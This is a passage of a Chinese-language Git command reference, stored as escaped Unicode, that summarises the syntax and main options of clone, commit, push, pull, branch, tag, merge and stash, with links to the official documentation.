\u5c06\u5b58\u50a8\u5e93\u514b\u9686\u5230\u65b0\u521b\u5efa\u7684\u76ee\u5f55\u4e2d\uff0c\u4e3a\u514b\u9686\u5b58\u50a8\u5e93\u4e2d\u7684\u6bcf\u4e2a\u5206\u652f\u521b\u5efa\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f: git clone [--template=<template-directory>] [-l] [-s] [--no-hardlinks] [-q] [-n] [--bare] [--mirror] [-o <name>] [-b <name>] [-u <upload-pack>] [--reference <repository>] [--dissociate] [--separate-git-dir <git-dir>] [--depth <depth>] [--[no-]single-branch] [--no-tags] [--recurse-submodules[=<pathspec>]] [--[no-]shallow-submodules] [--[no-]remote-submodules] [--jobs <n>] [--sparse] [--[no-]reject-shallow] [--filter=<filter> [--also-filter-submodules]] [--] <repository> [<directory>] git clone -q , --quiet \u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u5b89\u9759\u5730\u64cd\u4f5c\u3002\u8fdb\u5c55\u4e0d\u4f1a\u62a5\u544a\u7ed9\u6807\u51c6\u9519\u8bef\u6d41\u3002 git clone -n, --no-checkout\u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u514b\u9686\u5b8c\u6210\u540e\u4e0d\u4f1a\u6267\u884c HEAD \u7684\u68c0\u51fa\u3002 git clone --bare \u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u5236\u4f5c\u4e00\u4e2a\u88f8\u9732\u7684Git\u5b58\u50a8\u5e93\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u8981\u521b\u5efa <directory> \u5e76\u5c06\u7ba1\u7406\u6587\u4ef6\u653e\u7f6e\u5728 <directory>/.git \u4e2d\uff0c\u800c\u662f\u5c06 <directory> \u672c\u8eab\u8bbe\u7f6e\u4e3a $GIT_DIR \u3002 \u663e\u7136\u8fd9\u610f\u5473\u7740 --no-checkout \uff0c\u56e0\u4e3a\u6ca1\u6709\u5730\u65b9\u53ef\u4ee5\u68c0\u51fa\u5de5\u4f5c\u6811\u3002 \u540c\u6837\uff0c\u5c06\u8fdc\u7a0b\u7684\u5206\u652f\u5934\u76f4\u63a5\u590d\u5236\u5230\u76f8\u5e94\u7684\u672c\u5730\u5206\u652f\u5934\uff0c\u800c\u65e0\u9700\u5c06\u5176\u6620\u5c04\u5230 ref/remotes/origin/ \u3002 \u4f7f\u7528\u6b64\u9009\u9879\u65f6\uff0c\u4e0d\u4f1a\u521b\u5efa\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\u6216\u76f8\u5173\u7684\u914d\u7f6e\u53d8\u91cf\u3002 git clone --mirror \u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u8bbe\u7f6e\u6e90\u5b58\u50a8\u5e93\u7684\u955c\u50cf\u3002 \u8fd9\u610f\u5473\u7740\u88f8\u9732( --bare )\u3002 \u4e0e --bare \u76f8\u6bd4\uff0c --mirror \u4e0d\u4ec5\u5c06\u6e90\u7684\u672c\u5730\u5206\u652f\u6620\u5c04\u5230\u76ee\u6807\u7684\u672c\u5730\u5206\u652f\uff0c\u8fd8\u6620\u5c04\u6240\u6709\u5f15\u7528\uff08\u5305\u62ec\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\uff0c\u6ce8\u91ca\u7b49\uff09\uff0c\u5e76\u8bbe\u7f6e\u4e00\u4e2arefspec\u914d\u7f6e\uff0c\u4ee5\u4fbf\u6240\u6709\u8fd9\u4e9b\u5f15\u7528 \u88ab\u76ee\u6807\u5b58\u50a8\u5e93\u4e2d\u7684git\u8fdc\u7a0b\u66f4\u65b0\u8986\u76d6\u3002 git clone -b, --branch \u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u4e0d\u8981\u5c06\u65b0\u521b\u5efa\u7684HEAD\u6307\u5411\u514b\u9686\u7684\u5b58\u50a8\u5e93\u7684HEAD\u6240\u6307\u5411\u7684\u5206\u652f\uff0c\u800c\u662f\u6307\u5411 \u5206\u652f\u3002 git clone --depth \u3010\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740\u3011: \u521b\u5efa\u4e00\u4e2a\u6d45\u514b\u9686\uff0c\u5176\u5386\u53f2\u8bb0\u5f55\u88ab\u622a\u65ad\u4e3a\u6307\u5b9a\u7684\u63d0\u4ea4\u6570\u3002 \u8868\u793a --single-branch \uff0c\u9664\u975e\u7ed9\u51fa --no-single-branch \u6765\u83b7\u53d6\u6240\u6709\u5206\u652f\u7684\u5c16\u7aef\u9644\u8fd1\u7684\u5386\u53f2\u8bb0\u5f55\u3002 \u5982\u679c\u8981\u6d45\u5c42\u514b\u9686\u5b50\u6a21\u5757\uff0c\u5219\u8fd8\u8981\u4f20\u9012 --shallow-submodules \u3002 \u53c2\u8003: https://git-scm.com/docs/git-clone \u63d0\u4ea4 \uf0c1 git-commit - \u8bb0\u5f55\u5bf9\u5b58\u50a8\u5e93\u7684\u66f4\u6539 git commit [-a | --interactive | --patch] [-s] [-v] [-u<mode>] [--amend] [--dry-run] [(-c | -C | --squash) <commit> | --fixup [(amend|reword):]<commit>)] [-F <file> | -m <msg>] [--reset-author] [--allow-empty] [--allow-empty-message] [--no-verify] [-e] [--author=<author>] [--date=<date>] [--cleanup=<mode>] [--[no-]status] [-i | -o] [--pathspec-from-file=<file> [--pathspec-file-nul]] [(--trailer <token>[(=|:)<value>])\u2026\u200b] [-S[<keyid>]] [--] [<pathspec>\u2026\u200b] -F : \u4ece\u7ed9\u5b9a\u6587\u4ef6\u4e2d\u83b7\u53d6\u63d0\u4ea4\u6d88\u606f\u3002\u4f7f\u7528-\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u6d88\u606f\u3002 -m : \u4f7f\u7528\u7ed9\u5b9a\u7684 \u4f5c\u4e3a\u63d0\u4ea4\u6d88\u606f\u3002\u5982\u679c\u7ed9\u51fa\u4e86\u591a\u4e2a -m \u9009\u9879\uff0c\u5b83\u4eec\u7684\u503c\u5c06\u8fde\u63a5\u4e3a\u5355\u72ec\u7684\u6bb5\u843d\u3002 -m \u9009\u9879\u4e0e -c \u3001 -C \u548c -F \u4e92\u65a5\u3002 \u53c2\u8003: https://git-scm.com/docs/git-commit \u63a8\u9001 \uf0c1 git-push - \u66f4\u65b0\u8fdc\u7a0b\u5f15\u7528\u4ee5\u53ca\u5173\u8054\u5bf9\u8c61 git push [--all | --mirror | --tags] [--follow-tags] [--atomic] [-n | --dry-run] [--receive-pack=<git-receive-pack>] [--repo=<repository>] [-f | --force] [-d | --delete] [--prune] [-v | --verbose] [-u | --set-upstream] [-o <string> | --push-option=<string>] [--[no-]signed|--signed=(true|false|if-asked)] [--force-with-lease[=<refname>[:<expect>]] [--force-if-includes]] [--no-verify] [<repository> [<refspec>\u2026\u200b]] --tags : \u9664\u4e86\u5728\u547d\u4ee4\u884c\u4e0a\u660e\u786e\u5217\u51fa\u7684 refspecs \u4e4b\u5916\uff0c refs/tags \u6240\u6709\u7684 refs \u90fd\u4f1a\u88ab\u63a8\u9001\u3002 --atomic : \u5982\u679c\u53ef\u7528\uff0c\u8bf7\u5728\u8fdc\u7a0b\u7aef\u4f7f\u7528\u539f\u5b50\u4e8b\u52a1\u3002\u8981\u4e48\u66f4\u65b0\u6240\u6709 refs\uff0c\u8981\u4e48\u5728\u9519\u8bef\u65f6\u4e0d\u66f4\u65b0 refs\u3002\u5982\u679c\u670d\u52a1\u5668\u4e0d\u652f\u6301\u539f\u5b50\u63a8\u9001\uff0c\u63a8\u9001\u5c06\u5931\u8d25\u3002 -u | --set-upstream : \u5bf9\u4e8e\u6bcf\u4e2a\u6700\u65b0\u6216\u6210\u529f\u63a8\u9001\u7684\u5206\u652f\uff0c\u4f7f\u7528\u65e0\u53c2\u6570 git-pull \u548c\u5176\u4ed6\u547d\u4ee4\uff0c\u6dfb\u52a0\u4e0a\u6e38\uff08\u8ddf\u8e2a\uff09\u5f15\u7528\u3002 \u53c2\u8003: https://git-scm.com/docs/git-push \u66f4\u65b0 \uf0c1 git-pull - \u5c06\u6765\u81ea\u8fdc\u7a0b\u5b58\u50a8\u5e93\u7684\u66f4\u6539\u5408\u5e76\u5230\u5f53\u524d\u5206\u652f\u4e2d git pull [<options>] [<repository> [<refspec>\u2026\u200b]] \u53c2\u8003: https://git-scm.com/docs/git-pull \u5206\u652f \uf0c1 git-branch - \u5217\u51fa\u3001\u521b\u5efa\u6216\u5220\u9664\u5206\u652f git branch [--color[=<when>] | --no-color] [--show-current] [-v [--abbrev=<n> | --no-abbrev]] [--column[=<options>] | --no-column] [--sort=<key>] [--merged [<commit>]] [--no-merged [<commit>]] [--contains [<commit>]] [--no-contains [<commit>]] [--points-at <object>] [--format=<format>] [(-r | --remotes) | (-a | --all)] [--list] [<pattern>\u2026\u200b] git branch [--track[=(direct|inherit)] | --no-track] [-f] [--recurse-submodules] <branchname> [<start-point>] git branch (--set-upstream-to=<upstream> | -u <upstream>) [<branchname>] git branch --unset-upstream [<branchname>] git branch (-m | -M) [<oldbranch>] <newbranch> git branch (-c | -C) [<oldbranch>] <newbranch> git branch (-d | -D) [-r] <branchname>\u2026\u200b git branch --edit-description [<branchname>] \u5982\u679c\u7ed9\u51fa --list \uff0c\u6216\u8005\u6ca1\u6709\u975e\u9009\u9879\u53c2\u6570\uff0c\u5219\u5217\u51fa\u73b0\u6709\u5206\u652f\uff1b\u5f53\u524d\u5206\u652f\u5c06\u4ee5\u7eff\u8272\u7a81\u51fa\u663e\u793a\u5e76\u6807\u6709\u661f\u53f7\u3002\u5728\u94fe\u63a5\u7684\u5de5\u4f5c\u6811\u4e2d\u7b7e\u51fa\u7684\u4efb\u4f55\u5206\u652f\u90fd\u5c06\u4ee5\u9752\u8272\u7a81\u51fa\u663e\u793a\u5e76\u6807\u6709\u52a0\u53f7\u3002\u9009\u9879 -r \u5bfc\u81f4\u5217\u51fa\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\uff0c\u9009\u9879 -a \u663e\u793a\u672c\u5730\u548c\u8fdc\u7a0b\u5206\u652f\u3002 \u5982\u679c <pattern> \u7ed9\u5b9a\u4e86 a\uff0c\u5219\u5c06\u5176\u7528\u4f5c shell \u901a\u914d\u7b26\u4ee5\u5c06\u8f93\u51fa\u9650\u5236\u4e3a\u5339\u914d\u7684\u5206\u652f\u3002\u5982\u679c\u7ed9\u51fa\u4e86\u591a\u4e2a\u6a21\u5f0f\uff0c\u5219\u5982\u679c\u5b83\u4e0e\u4efb\u4f55\u6a21\u5f0f\u5339\u914d\uff0c\u5219\u4f1a\u663e\u793a\u4e00\u4e2a\u5206\u652f\u3002 \u8bf7\u6ce8\u610f\uff0c\u63d0\u4f9b <pattern> \u65f6\uff0c\u60a8\u5fc5\u987b\u4f7f\u7528 --list ; \u5426\u5219\u8be5\u547d\u4ee4\u53ef\u80fd\u88ab\u89e3\u91ca\u4e3a\u5206\u652f\u521b\u5efa\u3002 \u8be5\u547d\u4ee4\u7684\u7b2c\u4e8c\u79cd\u5f62\u5f0f\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <branchname> \u7684\u65b0\u5206\u652f\u5934\uff0c\u5b83\u6307\u5411\u5f53\u524d\u7684 HEAD \uff0c\u6216\u8005\u7ed9\u5b9a\u7684 <start-point> \u3002\u4f5c\u4e3a\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\uff0c\u5bf9\u4e8e <start-point> \uff0c\u60a8\u53ef\u4ee5\u5c06 \"A...B\" \u5176\u7528\u4f5c\u5408\u5e76\u57fa\u7840\u7684\u5feb\u6377\u65b9\u5f0f\uff0c A \u5e76\u4e14 B \u5982\u679c\u53ea\u6709\u4e00\u4e2a\u5408\u5e76\u57fa\u7840\u3002\u60a8\u6700\u591a\u53ef\u4ee5\u7701\u7565\u4e00\u4e2a A and B \uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5b83\u9ed8\u8ba4\u4e3a HEAD . \u8bf7\u6ce8\u610f\uff0c\u8fd9\u5c06\u521b\u5efa\u65b0\u5206\u652f\uff0c\u4f46\u4e0d\u4f1a\u5c06\u5de5\u4f5c\u6811\u5207\u6362\u5230\u5b83\uff1b\u4f7f\u7528\u201cgit switch \u201d\u5207\u6362\u5230\u65b0\u5206\u652f\u3002 \u4f7f\u7528 -m \u6216\u8005 -M \u9009\u9879\uff0c \u5c06\u88ab\u91cd\u547d\u540d\u4e3a \u3002\u5982\u679c \u6709\u76f8\u5e94\u7684 reflog\uff0c\u5219\u5c06\u5176\u91cd\u547d\u540d\u4ee5\u5339\u914d \uff0c\u5e76\u521b\u5efa\u4e00\u4e2a reflog \u6761\u76ee\u4ee5\u8bb0\u4f4f\u5206\u652f\u91cd\u547d\u540d\u3002\u5982\u679c \u5b58\u5728\uff0c\u5219\u5fc5\u987b\u4f7f\u7528 -M \u6765\u5f3a\u5236\u8fdb\u884c\u91cd\u547d\u540d\u3002 -c \u548c -C \u9009\u9879\u4e0e -m \u548c -M \u5177\u6709\u5b8c\u5168\u76f8\u540c\u7684\u8bed\u4e49\uff0c\u9664\u4e86\u5206\u652f\u4e0d\u4f1a\u88ab\u91cd\u547d\u540d\uff0c\u5b83\u5c06\u88ab\u590d\u5236\u5230\u4e00\u4e2a\u65b0\u540d\u79f0\uff0c\u4ee5\u53ca\u5b83\u7684\u914d\u7f6e\u548c reflog\u3002 \u5e26\u6709 -d \u6216 -D \u9009\u9879\uff0c \u5c06\u88ab\u5220\u9664\u3002\u60a8\u53ef\u4ee5\u6307\u5b9a\u591a\u4e2a\u8981\u5220\u9664\u7684\u5206\u652f\u3002\u5982\u679c\u5206\u652f\u5f53\u524d\u6709 reflog\uff0c\u5219 reflog \u4e5f\u5c06\u88ab\u5220\u9664\u3002 -r \u4e0e -d \u4e00\u8d77\u4f7f\u7528\u5220\u9664\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\u3002\u8bf7\u6ce8\u610f\uff0c\u53ea\u6709\u5728\u8fdc\u7a0b\u5b58\u50a8\u5e93\u4e2d\u4e0d\u518d\u5b58\u5728\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\u6216 git fetch \u914d\u7f6e\u4e3a\u4e0d\u518d\u83b7\u53d6\u5b83\u4eec\u65f6\uff0c\u5220\u9664\u8fdc\u7a0b\u8ddf\u8e2a\u5206\u652f\u624d\u6709\u610f\u4e49\u3002 \u53c2\u8003: https://git-scm.com/docs/git-branch \u6807\u7b7e \uf0c1 git-tag - \u521b\u5efa\u3001\u5217\u51fa\u3001\u5220\u9664\u6216\u4f7f\u7528 GPG \u7b7e\u540d\u7684\u9a8c\u8bc1\u6807\u7b7e\u5bf9\u8c61 git tag [-a | -s | -u <keyid>] [-f] [-m <msg> | -F <file>] [-e] <tagname> [<commit> | <object>] git tag -d <tagname>\u2026\u200b git tag [-n[<num>]] -l [--contains <commit>] [--no-contains <commit>] [--points-at <object>] [--column[=<options>] | --no-column] [--create-reflog] [--sort=<key>] [--format=<format>] [--merged <commit>] [--no-merged <commit>] [<pattern>\u2026\u200b] git tag -v [--format=<format>] <tagname>\u2026\u200b \u5728 refs/tags/ \u4e2d\u6dfb\u52a0\u6807\u7b7e\u5f15\u7528\uff0c\u9664\u975e -d/-l/-v \u7ed9\u51fa\u5220\u9664\u3001\u5217\u51fa\u6216\u9a8c\u8bc1\u6807\u7b7e\u3002 \u9664\u975e\u7ed9\u51fa -f \uff0c\u5426\u5219\u547d\u540d\u6807\u7b7e\u5fc5\u987b\u4e0d\u5b58\u5728\u3002 \u5982\u679c\u4f20\u9012\u4e86 -a \u3001 -s \u6216 -u <keyid> \u4e2d\u7684\u4e00\u4e2a\uff0c\u5219\u8be5\u547d\u4ee4\u5c06\u521b\u5efa\u4e00\u4e2a\u6807\u8bb0\u5bf9\u8c61\uff0c\u5e76\u9700\u8981\u4e00\u4e2a\u6807\u8bb0\u6d88\u606f\u3002\u9664\u975e\u7ed9\u51fa -m <msg> \u6216 -F <file> \uff0c\u5426\u5219\u5c06\u542f\u52a8\u4e00\u4e2a\u7f16\u8f91\u5668\u4f9b\u7528\u6237\u952e\u5165\u6807\u7b7e\u6d88\u606f\u3002 \u5982\u679c -m <msg> \u6216 -F <file> \u88ab\u7ed9\u51fa\u5e76\u4e14 -a , -s , \u548c -u <keyid> \u4e0d\u5b58\u5728,\u90a3\u4e48 -a \u662f\u9690\u542b\u7684\u3002 \u5426\u5219\uff0c\u5c06\u521b\u5efa\u76f4\u63a5\u6307\u5411\u7ed9\u5b9a\u5bf9\u8c61\u7684\u6807\u8bb0\u5f15\u7528\uff08\u5373\u8f7b\u91cf\u7ea7\u6807\u8bb0\uff09\u3002 \u4e00\u4e2a GnuPG \u7b7e\u540d\u7684\u6807\u7b7e\u5bf9\u8c61\u5c06\u5728 -s \u6216 -u <keyid> \u4f7f\u7528\u65f6\u521b\u5efa\u3002\u4e0d\u4f7f\u7528 -u <keyid> \u65f6\uff0c\u5f53\u524d\u7528\u6237\u7684\u63d0\u4ea4\u8005\u8eab\u4efd\u7528\u4e8e\u67e5\u627e GnuPG \u5bc6\u94a5\u8fdb\u884c\u7b7e\u540d\u3002\u914d\u7f6e\u53d8\u91cf gpg.program \u7528\u4e8e\u6307\u5b9a\u81ea\u5b9a\u4e49 GnuPG \u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u6807\u8bb0\u5bf9\u8c61\uff08\u7528 -a \u3001 -s \u6216 -u \u521b\u5efa\uff09\u79f0\u4e3a\u201c\u5e26\u6ce8\u91ca\u7684\u201d\u6807\u7b7e(annotated tag)\uff1b\u5b83\u4eec\u5305\u542b\u521b\u5efa\u65e5\u671f\u3001\u6807\u8bb0\u540d\u79f0\u548c\u7535\u5b50\u90ae\u4ef6\u3001\u6807\u8bb0\u6d88\u606f\u548c\u53ef\u9009\u7684 GnuPG \u7b7e\u540d\u3002\u800c\u201c\u8f7b\u91cf\u7ea7\u201d\u6807\u7b7e(lightweight tag)\u53ea\u662f\u5bf9\u8c61\uff08\u901a\u5e38\u662f\u63d0\u4ea4\u5bf9\u8c61\uff09\u7684\u7b80\u5355\u540d\u79f0\u3002 \u5e26\u6ce8\u91ca\u7684\u6807\u7b7e\u7528\u4e8e\u53d1\u5e03\uff0c\u800c\u8f7b\u91cf\u7ea7\u6807\u7b7e\u7528\u4e8e\u79c1\u6709\u6216\u4e34\u65f6\u5bf9\u8c61\u6807\u7b7e\u3002\u51fa\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u4e00\u4e9b\u7528\u4e8e\u547d\u540d\u5bf9\u8c61\u7684 git \u547d\u4ee4\uff08\u5982 git describe \uff09\u9ed8\u8ba4\u4f1a\u5ffd\u7565\u8f7b\u91cf\u7ea7\u6807\u7b7e\u3002 \u5728\u6211\u4eec\u4f7f\u7528 git push \u547d\u4ee4\u63a8\u9001\u67d0\u4e2a\u5206\u652f\u7684\u65f6\u5019\uff0c\u6807\u7b7e\u5e76\u4e0d\u4f1a\u88ab\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u6240\u4ee5 \u6211\u4eec\u5fc5\u987b\u663e\u5f0f\u7684\u63a8\u9001\u6807\u7b7e\u5230\u8fdc\u7a0b\u4ed3\u5e93 \u3002 \u4f7f\u7528\u4e0b\u9762\u4e24\u79cd\u547d\u4ee4\u5219\u53ef\u4ee5\u63a8\u9001\u6807\u7b7e\u5230\u8fdc\u7a0b\u4ed3\u5e93\uff1a git push <remote> <tag_name> \uff1a\u63a8\u9001\u67d0\u4e2a\u6807\u7b7e\u5230\u8fdc\u7a0b\u4ed3\u5e93\u3002 git push <remote> --tags \uff1a\u63a8\u9001\u6240\u6709\u6807\u7b7e\u5230\u8fdc\u7a0b\u4ed3\u5e93\u3002 \u540c\u6837\uff0c\u5728\u5220\u9664\u672c\u5730\u7684\u6807\u7b7e\u540e\uff0c\u8981\u60f3\u5220\u9664\u8fdc\u7a0b\u4ed3\u5e93\u7684\u6807\u7b7e\uff0c\u4e5f\u5fc5\u987b\u4f7f\u7528\u7684\u663e\u5f0f\u7684\u547d\u4ee4\uff1a git push <remote> --delete <tag_name> \uff1a\u5220\u9664\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\u7684\u67d0\u4e2a\u6807\u7b7e\u3002 git push <remote> :refs/tags/<tagname> \uff1a\u5220\u9664\u8fdc\u7a0b\u4ed3\u5e93\u67d0\u4e2a\u6807\u7b7e\u7684\u7b49\u4ef7\u65b9\u5f0f\uff0c\u76f8\u5f53\u4e8e\u5c06\u5192\u53f7\u524d\u9762\u7684\u7a7a\u503c\u63a8\u9001\u5230\u8fdc\u7a0b\u6807\u7b7e\u540d\uff0c\u4ece\u800c\u9ad8\u6548\u5730\u5220\u9664\u5b83\u3002 \u53c2\u8003: https://git-scm.com/docs/git-tag \u5408\u5e76 \uf0c1 git-merge - \u5c06\u4e24\u4e2a\u6216\u591a\u4e2a\u5f00\u53d1\u5386\u53f2\u8fde\u63a5\u5728\u4e00\u8d77 git merge [-n] [--stat] [--no-commit] [--squash] [--[no-]edit] [--no-verify] [-s <strategy>] [-X < strategy-option>] [-S[<keyid>]] [--[no-]allow-unrelated-histories] [--[no-]rerere-autoupdate] [-m <msg>] [-F <file >] [--into-name <branch>] [<commit>...\u200b] git merge (--continue | --abort | --quit) \u5728\u5e94\u7528\u5916\u90e8\u66f4\u6539\u4e4b\u524d\uff0c\u60a8\u5e94\u8be5\u8ba9\u81ea\u5df1\u7684\u5de5\u4f5c\u4fdd\u6301\u826f\u597d\u72b6\u6001\u5e76\u5728\u672c\u5730\u63d0\u4ea4\uff0c\u8fd9\u6837\u5982\u679c\u53d1\u751f\u51b2\u7a81\u5c31\u4e0d\u4f1a\u88ab\u7834\u574f\u3002\u53e6\u89c1 git-stash \u3002 \u5f53\u672c\u5730\u672a\u63d0\u4ea4\u7684\u66f4\u6539\u4e0e git pull / git merge \u53ef\u80fd\u9700\u8981\u66f4\u65b0\u7684\u6587\u4ef6\u91cd\u53e0\u65f6\uff0c git pull \u548c git merge \u5c06\u505c\u6b62\u800c\u4e0d\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 \u770b\u5230\u51b2\u7a81\u540e\uff0c\u60a8\u53ef\u4ee5\u505a\u4e24\u4ef6\u4e8b\uff1a \u51b3\u5b9a\u4e0d\u5408\u5e76\u3002\u60a8\u9700\u8981\u7684\u552f\u4e00\u6e05\u7406\u662f\u5c06\u7d22\u5f15\u6587\u4ef6\u91cd\u7f6e\u4e3a HEAD \u7684\u53cd\u5411\u63d0\u4ea4\uff0c \u5e76\u6e05\u7406\u6240\u505a\u7684\u5de5\u4f5c\u6811\u66f4\u6539\uff1b git merge --abort \u53ef\u7528\u4e8e\u6b64\u3002 \u89e3\u51b3\u51b2\u7a81\u3002Git \u5c06\u6807\u8bb0\u5de5\u4f5c\u6811\u4e2d\u7684\u51b2\u7a81\u3002\u5c06\u6587\u4ef6\u7f16\u8f91\u6210\u5f62\u72b6 \u5e76\u5c06\u5b83\u4eec\u6dfb\u52a0\u5230\u7d22\u5f15\u4e2d\u3002\u4f7f\u7528 git commit \u6216 git merge --continue \u6765\u5b8c\u6210\u4ea4\u6613\u3002\u540e\u4e00\u4e2a\u547d\u4ee4\u5728\u8c03\u7528 git commit \u4e4b\u524d\u68c0\u67e5\u662f\u5426\u6b63\u5728\u8fdb\u884c\uff08\u4e2d\u65ad\u7684\uff09\u5408\u5e76\u3002 \u60a8\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u5de5\u5177\u89e3\u51b3\u51b2\u7a81\uff1a \u4f7f\u7528\u5408\u5e76\u5de5\u5177\u3002 git mergetool \u542f\u52a8\u56fe\u5f62\u5408\u5e76\u5de5\u5177\uff0c\u5b83\u5c06\u5e2e\u52a9\u60a8\u5b8c\u6210\u5408\u5e76\u3002 \u770b\u770b\u5dee\u5f02\u3002 git diff \u5c06\u663e\u793a\u4e09\u5411\u5dee\u5f02\uff0c\u7a81\u51fa\u663e\u793a HEAD \u548c MERGE_HEAD \u7248\u672c\u7684\u66f4\u6539\u3002 \u67e5\u770b\u6bcf\u4e2a\u5206\u652f\u7684\u5dee\u5f02\u3002 git log --merge -p <path> \u5c06\u9996\u5148\u663e\u793a HEAD \u7248\u672c\u7684\u5dee\u5f02\uff0c\u7136\u540e\u663e\u793a MERGE_HEAD \u7248\u672c\u3002 \u770b\u770b\u539f\u4ef6\u3002 git show :1:filename \u663e\u793a\u5171\u540c\u7956\u5148\uff0c git show :2:filename \u663e\u793a HEAD \u7248\u672c\uff0c git show :3:filename \u663e\u793a MERGE_HEAD \u7248\u672c\u3002 \u53c2\u8003: https://git-scm.com/docs/git-merge \u6682\u5b58stash \uf0c1 git-stash - \u5c06\u66f4\u6539\u5b58\u50a8\u5728\u810f\u5de5\u4f5c\u76ee\u5f55\u4e2d git stash list [<log-options>] git stash show [-u|--include-untracked|--only-untracked] [<diff-options>] [<stash>] git stash drop [-q|--quiet] [<stash>] git stash ( pop | apply ) [--index] [-q|--quiet] [<stash>] git stash branch <branchname> [<stash>] git stash [push [-p|--patch] [-S|--staged] [-k|--[no-]keep-index] [-q|--quiet] [-u|--include-untracked] [-a|--all] [-m|--message <message>] [--pathspec-from-file=<file> [--pathspec-file-nul]] [--] [<pathspec>\u2026\u200b]] git stash clear git stash create [<message>] git stash store [-m|--message <message>] [-q|--quiet] <commit> \u5f53\u60a8\u60f3\u8bb0\u5f55\u5de5\u4f5c\u76ee\u5f55\u548c\u7d22\u5f15\u7684\u5f53\u524d\u72b6\u6001\uff0c\u4f46\u53c8\u60f3\u56de\u5230\u5e72\u51c0\u7684\u5de5\u4f5c\u76ee\u5f55\u65f6\u4f7f\u7528 git stash \u3002\u8be5\u547d\u4ee4\u4fdd\u5b58\u60a8\u7684\u672c\u5730\u4fee\u6539\u5e76\u6062\u590d\u5de5\u4f5c\u76ee\u5f55\u4ee5\u5339\u914d HEAD \u63d0\u4ea4\u3002 \u8be5\u547d\u4ee4\u9690\u85cf\u7684\u4fee\u6539\u53ef\u4ee5\u7528 git stash list \u5217\u51fa \u3001 git stash show \u68c0\u67e5\u548c git stash apply \u6062\u590d\uff08\u53ef\u80fd\u5728\u4e0d\u540c\u7684\u63d0\u4ea4\u4e4b\u4e0a\uff09\u3002 git stash \u4e0d\u5e26\u4efb\u4f55\u53c2\u6570\u7684\u8c03\u7528\u7b49\u6548\u4e8e git stash push . \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b58\u50a8\u88ab\u5217\u4e3a\u201cWIP on branchname ...\u200b\u201d\uff0c\u4f46\u60a8\u53ef\u4ee5\u5728\u521b\u5efa\u65f6\u5728\u547d\u4ee4\u884c\u4e0a\u63d0\u4f9b\u66f4\u5177\u63cf\u8ff0\u6027\u7684\u6d88\u606f\u3002 \u60a8\u521b\u5efa\u7684\u6700\u65b0\u5b58\u50a8\u5b58\u50a8\u5728 refs/stash ; \u8f83\u65e7\u7684\u5b58\u50a8\u53ef\u5728\u6b64\u53c2\u8003\u7684 reflog \u4e2d\u627e\u5230\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528\u901a\u5e38\u7684 reflog \u8bed\u6cd5\u547d\u540d\uff08\u4f8b\u5982 stash@{0} \uff0c\u662f\u6700\u8fd1\u521b\u5efa\u7684\u5b58\u50a8\uff0c stash@{1} \u662f\u5b83\u4e4b\u524d\u7684\u5b58\u50a8\uff0c stash@{2.hours.ago} \u4e5f\u662f\u53ef\u80fd\u7684\uff09\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4ec5\u6307\u5b9a\u5b58\u50a8\u7d22\u5f15\u6765\u5f15\u7528\u5b58\u50a8\uff08\u4f8b\u5982\uff0c\u6574\u6570 n \u7b49\u4ef7\u4e8e stash@{n} \uff09\u3002 push [-m | --message ] [--] [ \u2026\u200b ] : \u5c06\u672c\u5730\u4fee\u6539\u4fdd\u5b58\u5230\u65b0\u7684\u5b58\u50a8\u6761\u76ee\u5e76\u5c06\u5b83\u4eec\u56de\u6eda\u5230 HEAD\uff08\u5728\u5de5\u4f5c\u6811\u548c\u7d22\u5f15\u4e2d\uff09\u3002 <message> \u90e8\u5206\u662f\u53ef\u9009\u7684\uff0c\u5b83\u63d0\u4f9b\u63cf\u8ff0\u4ee5\u53ca\u9690\u85cf\u72b6\u6001\u3002 save : \u6b64\u9009\u9879\u5df2\u5f03\u7528\uff0c\u53d6\u800c\u4ee3\u4e4b\u7684\u662f git stash push \u3002\u5b83\u4e0e\u201cstash push\u201d\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u5b83\u4e0d\u80fd\u91c7\u7528 pathspec\u3002\u76f8\u53cd\uff0c\u6240\u6709\u975e\u9009\u9879\u53c2\u6570\u90fd\u8fde\u63a5\u8d77\u6765\u5f62\u6210\u5b58\u50a8\u6d88\u606f\u3002 list [ ] : \u5217\u51fa\u60a8\u5f53\u524d\u62e5\u6709\u7684\u5b58\u50a8\u6761\u76ee\u3002\u6bcf\u4e2a\u5b58\u50a8\u6761\u76ee\u90fd\u5217\u51fa\u4e86\u5b83\u7684\u540d\u79f0\uff08\u4f8b\u5982stash@{0}\uff0c\u662f\u6700\u65b0\u7684\u6761\u76ee\uff0cstash@{1}\u662f\u4e4b\u524d\u7684\u6761\u76ee\uff0c\u7b49\u7b49\uff09\uff0c\u521b\u5efa\u6761\u76ee\u65f6\u5f53\u524d\u5206\u652f\u7684\u540d\u79f0\uff0c\u4ee5\u53ca\u8be5\u6761\u76ee\u6240\u57fa\u4e8e\u7684\u63d0\u4ea4\u7684\u7b80\u77ed\u63cf\u8ff0. stash@{0}: WIP on 